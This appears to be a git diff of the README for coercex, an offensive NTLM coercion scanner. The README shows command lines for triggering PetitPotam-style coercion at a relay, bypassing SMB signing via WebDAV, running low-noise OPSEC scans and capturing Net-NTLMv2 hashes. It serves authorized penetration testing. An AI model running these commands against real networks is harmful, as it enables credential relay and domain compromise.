@@ -1,21 +1,28 @@
 # coercex
 
-Async NTLM authentication coercion scanner. A high-performance replacement for Coercer and PetitPotam.
+Async NTLM authentication coercion scanner built on top of
+[Coercer](https://github.com/p0dalirius/Coercer) by
+[@p0dalirius](https://github.com/p0dalirius).
+
+Coercer pioneered automated NTLM coercion scanning and established the
+method catalogue that coercex builds upon. coercex is an async rewrite
+focused on performance and scan accuracy for large-scale engagements.
 
 ![coercex demo](assets/demo.gif)
 
-## Features
+## What coercex adds
 
-- **19 coercion methods** across 7 protocols: MS-EFSR (10), MS-RPRN (2), MS-DFSNM (2), MS-FSRVP (2), MS-EVEN (1), MS-PAR (1), MS-TSCH (1)
-- **2 operation modes**: scan (detect vulnerable methods), coerce (trigger coercion at external relay)
-- **Method/pipe/protocol filtering** with glob and regex pattern matching
-- **Kerberos authentication** with ccache/TGT/TGS support
-- **Async architecture** with configurable concurrency (50-200 concurrent tasks)
-- **Connection pooling** by (target, pipe, UUID) for session reuse
-- **WebDAV transport** support (`\\host@port\share` format) to bypass SMB signing
-- **Port redirect** via pydivert (Windows only) for non-standard listener ports
-- **Token correlation** for confirmed callback verification (scan mode)
-- **Rich live display** with per-target progress bars, real-time findings table, and phase indicators (probe/scan/drain)
+| Area | Improvement |
+|------|-------------|
+| **Async architecture** | `asyncio` with 50-200 concurrent tasks vs synchronous/threading |
+| **Connection pooling** | Sessions keyed by (target, pipe, UUID) and reused across attempts |
+| **Pre-flight probing** | Tests RPC bindings before triggering -- eliminates ~40-50% of futile attempts |
+| **Pipe discovery** | Optional `--discover-pipes` enumerates IPC$ pipes per target to skip missing endpoints |
+| **Token-based correlation** | Unique token in every UNC path for definitive callback verification |
+| **Rich TUI** | Live progress bars, findings table, and phase indicators (probe/scan/drain) |
+| **Extra protocols** | MS-PAR and MS-TSCH (19 methods / 7 protocols total vs Coercer's 17 / 5) |
+| **OPSEC modes** | `--stop-on-vulnerable`, `--delay`, `-c 1 --transport http` for low-noise scans |
+| **Test suite** | 202 pytest tests covering scanner, listener, display, and method registry |
 
 ## Installation
 
@@ -23,149 +30,110 @@ Async NTLM authentication coercion scanner. A high-performance replacement for C
 uv sync
 ```
 
+Requires Python 3.13+.
+
 ## Quick Start
 
-### Scan for coercible methods
+### Scan
 
 ```bash
-# Scan a single target (listener auto-detects local IP)
+# Single target (listener IP auto-detected)
 coercex scan -t dc01.corp.local -u user -p pass -d corp.local
 
-# Scan with explicit listener IP
-coercex scan -t dc01.corp.local -l 10.0.0.5 -u user -p pass -d corp.local
+# Explicit listener, multiple targets, EFSR only
+coercex scan -T targets.txt -l 10.0.0.5 -u user -p pass --protocols MS-EFSR
 
-# Scan multiple targets from file, EFSR only
-coercex scan -T targets.txt -u user -p pass --protocols MS-EFSR
+# Fast scan -- stop at first confirmed vulnerability per target
+coercex scan -t dc01 -u user -p pass --stop-on-vulnerable
 
-# Scan only specific methods by name (glob pattern)
-coercex scan -t dc01 -u user -p pass --methods 'EfsRpc*'
+# Discover pipes before scanning (skips endpoints whose pipes are absent)
+coercex scan -t dc01 -u user -p pass --discover-pipes
 
-# Scan only methods available on spoolss pipe
-coercex scan -t dc01 -u user -p pass --pipes '\PIPE\spoolss'
-
-# High-concurrency scan with hash auth
-coercex scan -t dc01.corp.local -u user -H aad3b435b51404ee:abc123... -d corp --concurrency 200
-
-# Scan on non-standard ports with port redirect (Windows only, requires Admin)
-coercex scan -t dc01 -u user -p pass --smb-port 4445 --http-port 8080 --redirect
+# OPSEC-conscious: sequential, HTTP-only, 2 s delay
+coercex scan -t dc01 -u user -p pass --stop-on-vulnerable \
+  -c 1 --transport http --delay 2
 ```
 
-### Coerce with external relay
+### Coerce
 
-Use `coerce` mode alongside ntlmrelayx (or any other relay tool). coercex only
-sends RPC triggers -- it does NOT bind any ports.
+Use alongside ntlmrelayx or any relay tool. coercex fires RPC triggers
+only -- it does **not** bind any ports.
 
 ```bash
-# Trigger coercion pointing at your relay
+# Trigger all methods toward your relay
 coercex coerce -t dc01.corp.local -l 10.0.0.5 -u user -p pass -d corp.local
 
-# Coerce with specific methods from scan results
+# Only trigger a specific method from scan results
 coercex coerce -t dc01 -l 10.0.0.5 -u user -p pass --methods 'EfsRpcOpenFileRaw'
 
-# Coerce via specific protocol + pipe
-coercex coerce -t dc01 -l 10.0.0.5 -u user -p pass --protocols MS-RPRN --pipes '\PIPE\spoolss'
-
-# Via WebDAV only (bypass SMB signing)
-coercex coerce -t dc01.corp.local -l 10.0.0.5 -u user -p pass --transport http
-
-# Via SMB only
-coercex coerce -t dc01.corp.local -l 10.0.0.5 -u user -p pass --transport smb
-
-# Both transports (default)
-coercex coerce -t dc01.corp.local -l 10.0.0.5 -u user -p pass --transport smb --transport http
+# WebDAV only (bypass SMB signing)
+coercex coerce -t dc01 -l 10.0.0.5 -u user -p pass --transport http
 ```
 
 ## Authentication
 
-### Password / NTLM hash
-
 ```bash
+# Password
 coercex scan -t dc01 -u admin -p 'P@ssw0rd' -d corp.local
-coercex scan -t dc01 -u admin -H 'aad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889' -d corp.local
-```
 
-### Kerberos with ccache
+# NTLM hash
+coercex scan -t dc01 -u admin -H 'aad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889'
 
-```bash
-# Use a ccache file directly
+# Kerberos ccache
 coercex scan -t dc01 --ccache /tmp/krb5cc_admin -d corp.local
 
-# Or set KRB5CCNAME and use -k
+# KRB5CCNAME + -k
 export KRB5CCNAME=/tmp/krb5cc_admin
 coercex scan -t dc01 -k -d corp.local --dc-host dc01.corp.local
 
-# AES key for Kerberos pre-auth
-coercex scan -t dc01 -u admin --aes-key 4a3f... -k --dc-host dc01.corp.local -d corp.local
+# AES key
+coercex scan -t dc01 -u admin --aes-key 4a3f... -k --dc-host dc01.corp.local
 ```
 
 ## Modes
 
 | Mode | Listener | Binds Ports | Description |
 |------|----------|-------------|-------------|
-| `scan` | Optional (`-l`) | HTTP+SMB listener | Try all path styles per method. Always starts a listener for callback confirmation. If `-l` omitted, auto-detects local IP. |
-| `coerce` | **Required** (`-l`) | **None** | Fire coercion at `--listener` where your relay (e.g. ntlmrelayx) is already running. Reports `SENT` for every trigger dispatched. |
+| `scan` | Optional (`-l`) | HTTP + SMB | Triggers methods and confirms callbacks on a local listener. Auto-detects listener IP if `-l` is omitted. |
+| `coerce` | **Required** (`-l`) | **None** | Fire-and-forget triggers toward an external relay. Reports `SENT` for every trigger dispatched. |
 
 ### Typical workflow
 
-1. **Scan** to find which methods are vulnerable on the target
-2. **Start ntlmrelayx** (or similar) pointing at your relay target
-3. **Coerce** with `--methods` filter to trigger only the working methods
+1. **Scan** to find vulnerable methods on the target.
+2. **Start ntlmrelayx** (or similar) pointed at the relay target.
+3. **Coerce** with `--methods` to trigger only the working methods.
 
 ## Result Classification
 
 | Status | Symbol | Meaning |
 |--------|--------|---------|
 | `VULNERABLE` | `[+]` | Callback confirmed on our listener (strongest signal) |
-| `ACCESSIBLE` | `[~]` | Method processed our path (RPC success or indicative error code like `BAD_NETPATH`), but no callback confirmation yet |
-| `SENT` | `[>]` | Coerce mode only -- trigger dispatched, no classification attempted |
+| `ACCESSIBLE` | `[~]` | RPC accepted our path but no callback yet |
+| `SENT` | `[>]` | Coerce mode -- trigger dispatched, no verification |
 | `ACCESS_DENIED` | `[-]` | RPC returned access denied |
-| `NOT_AVAILABLE` | `[ ]` | Endpoint/method not available on target |
+| `NOT_AVAILABLE` | `[ ]` | Endpoint or method not available |
 | `CONNECT_ERROR` | `[!]` | Could not connect to RPC pipe |
 | `TIMEOUT` | `[T]` | Connection or RPC timed out |
 
-## Port Redirect
-
-When binding on non-standard ports (e.g. `--smb-port 4445 --http-port 8080`
-because default ports are in use), standard UNC paths (`\\host\share`) won't
-reach your listener since SMB always connects to port 445.
-
-Two solutions:
-
-1. **WebDAV format** (automatic fallback): UNC paths become `\\host@4445\share`.
-   Requires the WebClient service on the target (often disabled by default).
-
-2. **Port redirect** (`--redirect`, Windows only): Uses pydivert to NAT
-   standard ports to your listener ports at the kernel level. UNC paths stay
-   in standard format. Requires admin privileges.
-
-```bash
-# Windows only: pydivert NAT rules (445->4445, 80->8080)
-coercex scan -t dc01 -u user -p pass --smb-port 4445 --http-port 8080 --redirect
-
-# If redirect fails, coercex falls back to WebDAV @port format with a warning
-```
-
 ## Filtering
 
-Both modes support `--methods`, `--pipes`, `--protocols`, and `--transport` filters:
-
 ```bash
-# Filter by protocol
+# By protocol
 coercex scan -t dc01 -u user -p pass --protocols MS-EFSR MS-RPRN
 
-# Filter by method name (glob pattern)
-coercex scan -t dc01 -u user -p pass --methods 'RpcRemote*'
+# By method name (glob)
+coercex scan -t dc01 -u user -p pass --methods 'EfsRpc*'
 
-# Filter by method name (regex)
+# By method name (regex)
 coercex scan -t dc01 -u user -p pass --methods 'EfsRpc.*Raw'
 
-# Filter by named pipe
+# By named pipe
 coercex scan -t dc01 -u user -p pass --pipes '\PIPE\spoolss'
 
-# Filter by transport
+# By transport
 coercex scan -t dc01 -u user -p pass --transport smb
 
-# Combine filters
+# Combine
 coercex coerce -t dc01 -l 10.0.0.5 -u user -p pass \
   --protocols MS-EFSR --methods 'EfsRpcOpenFileRaw'
 ```
@@ -174,73 +142,49 @@ coercex coerce -t dc01 -l 10.0.0.5 -u user -p pass \
 
 | Protocol | Methods | Description |
 |----------|---------|-------------|
-| MS-EFSR | 10 | Encrypting File System Remote Protocol |
-| MS-RPRN | 2 | Print System Remote Protocol |
-| MS-DFSNM | 2 | Distributed File System Namespace Management |
-| MS-FSRVP | 2 | File Server Remote VSS Protocol |
+| MS-EFSR | 10 | Encrypting File System Remote Protocol (PetitPotam) |
+| MS-RPRN | 2 | Print System Remote Protocol (PrinterBug) |
+| MS-DFSNM | 2 | Distributed File System Namespace Management (DFSCoerce) |
+| MS-FSRVP | 2 | File Server Remote VSS Protocol (ShadowCoerce) |
 | MS-EVEN | 1 | EventLog Remoting Protocol |
 | MS-PAR | 1 | Print System Asynchronous Remote Protocol |
 | MS-TSCH | 1 | Task Scheduler Service Remote Protocol |
 
-## Output
+## Scan Phases
 
-Scan mode shows a Rich live display with three phases:
+1. **Pipe discovery** (optional, `--discover-pipes`) -- enumerates IPC$ pipes
+   per target to pre-filter the binding set.
+2. **Pre-flight probe** -- tests connectivity to unique RPC bindings; skips
+   unreachable endpoints.
+3. **Scan / Coerce** -- fires triggers with per-target progress bars.
+4. **Drain** -- waits for late callbacks; enriches VULNERABLE results with
+   captured Net-NTLMv2 hashes.
 
-1. **Probe phase** -- pre-flight endpoint probing with a spinner, testing
-   connectivity to unique RPC bindings before attempting triggers
-2. **Scan phase** -- per-target progress bars with inline counters
-   (`completed/total`), and a findings table showing VULNERABLE, ACCESSIBLE,
-   and SENT results as they arrive
-3. **Drain phase** -- waits for late callbacks to confirm results; enriches
-   VULNERABLE results with captured Net-NTLMv2 hashes
+## Port Redirect
 
-The live display is the primary interactive output. Interesting results
-(VULNERABLE, ACCESSIBLE, SENT) are shown in the findings table. Captured
-NTLMv2 hashes are printed inline with the result.
+When the default ports (445/80) are in use, two options exist:
+
+1. **WebDAV format** (automatic): UNC paths become `\\host@4445\share`.
+   Requires the WebClient service on the target.
+2. **Port redirect** (`--redirect`, Windows only): pydivert NAT rules keep
+   UNC paths in standard format. Requires admin privileges.
 
 ```bash
-# Default scan (live display with findings table + progress bars)
-coercex scan -t dc01 -u user -p pass
-
-# Verbose: show INFO-level log messages above the live display
-coercex scan -t dc01 -u user -p pass -v
-
-# Debug: show DEBUG-level log messages (very noisy)
-coercex scan -t dc01 -u user -p pass --debug
-
-# JSON output (machine-readable, no live display)
-coercex scan -t dc01 -u user -p pass --json
-
-# Write results to file (in addition to live display)
-coercex scan -t dc01 -u user -p pass -o results.txt
-coercex scan -t dc01 -u user -p pass --json -o results.json
+coercex scan -t dc01 -u user -p pass --smb-port 4445 --http-port 8080 --redirect
 ```
 
-## Architecture
+## Credits
 
-```mermaid
-graph TD
-    CLI["CLI<br/><i>Typer + Rich</i>"]
-    Display["ScanDisplay<br/><i>Rich Live TUI</i>"]
-    Scanner["Scanner<br/><i>async orchestrator</i>"]
-    Pool["DCERPCPool<br/><i>connection pool</i>"]
-    Listener["Listener<br/><i>HTTP + SMB</i>"]
-    Methods["Methods<br/><i>19 across 7 protocols</i>"]
-    Targets["Target hosts"]
+coercex would not exist without the foundational work of:
 
-    CLI --> Scanner
-    CLI --> Display
-    Scanner --> Display
-    Scanner --> Pool
-    Scanner --> Listener
-    Pool --> Methods
-    Listener --> Targets
-    Methods --> Targets
-```
-
-- **CLI** (`cli/`): Typer commands, Rich console, logging setup, display lifecycle
-- **ScanDisplay** (`cli/display.py`): Rich Live widget with per-target progress bars, findings table, and phase transitions (probe/scan/drain/done)
-- **Scanner** (`scanner.py`): Async orchestrator with semaphore-bounded concurrency, pre-flight probing, callback correlation (token + IP-based fallback with transport check), drain enrichment
-- **DCERPCPool** (`connection.py`): Connection pool keyed by (target, pipe, UUID), all impacket calls wrapped with `asyncio.to_thread()`, double-lock pattern
-- **Listener** (`listener/`): Async HTTP + SMB listener with token-based callback correlation, Net-NTLMv2 hash capture, NTLM challenge/response parsing
-- **Methods** (`methods/`): Registry of 19 coercion methods across 7 protocols with pipe binding metadata, glob/regex filtering
+- **[Coercer](https://github.com/p0dalirius/Coercer)** by
+  [@p0dalirius](https://github.com/p0dalirius) -- the original NTLM
+  coercion scanner that defined the method catalogue and scan/coerce/fuzz
+  workflow. Coercer remains the reference implementation and supports
+  features coercex does not (fuzz mode, XLSX/SQLite export, Python 3.7+
+  compatibility).
+- **[PetitPotam](https://github.com/topotam/PetitPotam)** by
+  [@topotam](https://github.com/topotam) -- original MS-EFSR coercion
+  research.
+- **[impacket](https://github.com/fortra/impacket)** by Fortra -- the
+  underlying SMB/DCERPC library that makes all of this possible.
